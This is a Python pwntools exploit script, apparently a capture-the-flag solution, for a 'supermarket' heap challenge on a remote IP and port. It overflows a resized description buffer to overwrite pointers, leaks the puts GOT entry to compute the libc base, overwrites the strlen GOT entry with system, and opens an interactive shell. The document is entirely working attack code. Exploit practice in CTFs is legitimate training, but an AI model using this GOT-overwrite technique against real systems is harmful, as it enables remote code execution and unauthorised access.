from pwn import *

#p = process("./task_supermarket")
p = remote("49.4.23.227",32359)
def add(name,size,des):
	p.recvuntil("your choice>> ")
	p.sendline("1")
	p.recvuntil("name:")
	p.sendline(name)
	p.recvuntil("price:")
	p.sendline("20")
	p.recvuntil("descrip_size:")
	p.sendline(str(size))
	p.recvuntil("description:")
	p.sendline(des)

def change_des(name,size,des):
	p.recvuntil("your choice>> ")
	p.sendline("5")
	p.recvuntil("name:")
	p.sendline(name)
	p.recvuntil("descrip_size:")
	p.sendline(str(size))
	p.recvuntil("description:")
	p.sendline(des)

def lst():
	p.recvuntil("your choice>> ")
	p.sendline("3")
	p.recvuntil("price.1633771873, des.")
	addr = u32(p.recv(4))
	print hex(addr)
	return addr


strlen_got = 0x0804B034
printf_got = 0x0804B014
puts_got = 0x0804B02C
system = 0x0003A940 
strlen = 0x000747E0 
puts = 0x0005F140

add("/bin/sh",200,"111")
change_des("/bin/sh",50,'111')
add("2",20,"222")
change_des("/bin/sh",200,'a'*0x4c + p32(50) + p32(puts_got))
libc_base = lst() - puts
print hex(libc_base)
system = libc_base + system
change_des("/bin/sh",200,"/bin/sh\x00" + 'a'*0x44 + p32(50) + p32(strlen_got))
change_des("aaaaaaaaaaaaaaaaaaaa2",50,p32(system))
p.sendline("3")
p.interactive()